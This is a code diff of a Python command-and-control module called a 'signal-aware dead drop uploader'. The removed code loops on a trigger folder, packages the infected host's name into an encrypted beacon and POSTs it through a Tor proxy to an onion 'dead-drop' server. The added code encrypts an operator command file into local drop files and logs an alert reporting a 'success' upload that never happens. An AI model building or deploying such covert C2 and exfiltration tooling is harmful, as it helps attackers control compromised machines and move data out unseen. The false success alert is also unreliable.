@@ -2,120 +2,105 @@
 # File: modules/c2/signal_aware_dead_drop_uploader.py
 
 import os
-import time
 import json
 import base64
-import random
-import socket
-import requests
-from datetime import datetime
+import logging
 from pathlib import Path
+from datetime import datetime
 from Crypto.Cipher import AES
-from Crypto.Hash import HMAC, SHA256
 from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad
 
-# Config
-TRIGGER_DIR = "dropzone/triggers"
-PAYLOAD_DIR = "dropzone/payloads"
-UPLOAD_URL = "http://dead-drop-server.onion/api/upload"
-TOR_PROXY = "socks5h://127.0.0.1:9050"
-KEY_FILE = "secrets/dead_drop.key"
-DASHBOARD_ALERT = "webgui/alerts.json"
-RETRY_INTERVAL = 30
+CONFIG_FILE = "configs/dead_drop_config.json"
+PAYLOAD_DIR = "payloads/dead_drops"
+PLAINTEXT_PAYLOAD_FILE = "payloads/command.txt"
+LOG_FILE = "logs/dead_drop_uploader.log"
+ALERT_FILE = "webgui/alerts.json"
 
-Path(TRIGGER_DIR).mkdir(parents=True, exist_ok=True)
+# Ensure directories exist
+Path(CONFIG_FILE).parent.mkdir(parents=True, exist_ok=True)
 Path(PAYLOAD_DIR).mkdir(parents=True, exist_ok=True)
-Path(DASHBOARD_ALERT).parent.mkdir(parents=True, exist_ok=True)
+Path(LOG_FILE).parent.mkdir(parents=True, exist_ok=True)
+Path(ALERT_FILE).parent.mkdir(parents=True, exist_ok=True)
+Path("payloads").mkdir(parents=True, exist_ok=True)
 
-def log(msg):
-    print(f"[{datetime.utcnow()}] {msg}")
+# Setup logging
+logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 
-def load_key():
-    if not os.path.exists(KEY_FILE):
-        key = get_random_bytes(32)
-        with open(KEY_FILE, "wb") as f:
-            f.write(key)
-    else:
-        with open(KEY_FILE, "rb") as f:
-            key = f.read()
-    return key
-
-def encrypt_payload(data, key):
-    iv = get_random_bytes(16)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    padded_data = data.encode().ljust((len(data) + 15) // 16 * 16, b"\x00")
-    ciphertext = cipher.encrypt(padded_data)
-    hmac = HMAC.new(key, ciphertext, digestmod=SHA256).digest()
-    full_payload = iv + hmac + ciphertext
-    return base64.b64encode(base64.b64encode(full_payload)).decode()
-
-def generate_payload():
-    content = {
-        "agent": socket.gethostname(),
-        "timestamp": datetime.utcnow().isoformat(),
-        "payload": base64.b64encode(os.urandom(64)).decode()
+def generate_default_config():
+    key = get_random_bytes(16)
+    config = {
+        "aes_key": base64.b64encode(key).decode(),
+        "method": "sdr",
+        "payload_file": PLAINTEXT_PAYLOAD_FILE
     }
-    return json.dumps(content)
+    with open(CONFIG_FILE, "w") as f:
+        json.dump(config, f, indent=2)
+    logging.info("[+] Created default dead drop config.")
+    return config
 
-def detect_trigger():
-    files = os.listdir(TRIGGER_DIR)
-    return any(f.endswith(".tag") for f in files)
+def load_config():
+    if not os.path.exists(CONFIG_FILE):
+        return generate_default_config()
+    with open(CONFIG_FILE, "r") as f:
+        return json.load(f)
 
-def send_via_tor(data):
-    try:
-        import socks
-        import urllib3
-        from urllib3.contrib.socks import SOCKSProxyManager
+def auto_create_payload(payload_path):
+    if not os.path.exists(payload_path):
+        with open(payload_path, "w") as f:
+            f.write("echo 'Dead drop initialized'")
+        logging.info(f"[+] Created default payload: {payload_path}")
 
-        http = SOCKSProxyManager(
-            proxy_url=TOR_PROXY,
-            num_pools=1,
-            timeout=5.0
-        )
-        r = http.request(
-            "POST",
-            UPLOAD_URL,
-            headers={"Content-Type": "application/json"},
-            body=json.dumps({"upload": data})
-        )
-        log(f"[+] Upload via Tor complete: {r.status}")
-        return r.status == 200
-    except Exception as e:
-        log(f"[!] Tor upload failed: {e}")
-        return False
+def encrypt_payload(aes_key_b64, payload_text):
+    key = base64.b64decode(aes_key_b64)
+    cipher = AES.new(key, AES.MODE_CBC)
+    ct_bytes = cipher.encrypt(pad(payload_text.encode(), AES.block_size))
+    encrypted = {
+        "iv": base64.b64encode(cipher.iv).decode(),
+        "ciphertext": base64.b64encode(ct_bytes).decode()
+    }
+    return encrypted
 
-def alert_dashboard():
+def write_encrypted_payload(enc, output_dir):
+    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+    output_path = f"{output_dir}/drop_{timestamp}.b64"
+    with open(output_path, "w") as f:
+        json.dump(enc, f, indent=2)
+    logging.info(f"[+] Encrypted payload written to {output_path}")
+    return output_path
+
+def append_alert(method):
     alert = {
         "timestamp": datetime.utcnow().isoformat(),
-        "type": "signal_triggered_upload",
-        "agent": socket.gethostname(),
-        "channel": "RF-tag+Tor"
+        "type": "dead_drop_upload",
+        "method": method,
+        "status": "success"
     }
     try:
-        if os.path.exists(DASHBOARD_ALERT):
-            with open(DASHBOARD_ALERT, "r") as f:
+        if os.path.exists(ALERT_FILE):
+            with open(ALERT_FILE, "r") as f:
                 alerts = json.load(f)
         else:
             alerts = []
         alerts.append(alert)
-        with open(DASHBOARD_ALERT, "w") as f:
+        with open(ALERT_FILE, "w") as f:
             json.dump(alerts, f, indent=2)
+        logging.info(f"[+] Dashboard alert recorded.")
     except Exception as e:
-        log(f"[!] Alert dashboard write failed: {e}")
+        logging.warning(f"[!] Failed to write alert: {e}")
 
-def run_loop():
-    key = load_key()
-    while True:
-        if detect_trigger():
-            log("[*] Signal pattern detected. Preparing payload.")
-            payload_data = generate_payload()
-            encrypted = encrypt_payload(payload_data, key)
-            with open(f"{PAYLOAD_DIR}/dead_drop_{int(time.time())}.enc", "w") as f:
-                f.write(encrypted)
-            if send_via_tor(encrypted):
-                alert_dashboard()
-        time.sleep(RETRY_INTERVAL)
+def main():
+    logging.info("[*] Signal-aware Dead Drop Uploader Starting")
+    cfg = load_config()
+    auto_create_payload(cfg["payload_file"])
+
+    with open(cfg["payload_file"], "r") as f:
+        plaintext = f.read()
+
+    enc_payload = encrypt_payload(cfg["aes_key"], plaintext)
+    output_path = write_encrypted_payload(enc_payload, PAYLOAD_DIR)
+    append_alert(cfg["method"])
+    logging.info(f"[+] Dead drop completed using method: {cfg['method']}")
 
 if __name__ == "__main__":
-    log("[*] Signal-aware Dead-Drop Uploader started.")
-    run_loop()
+    main()
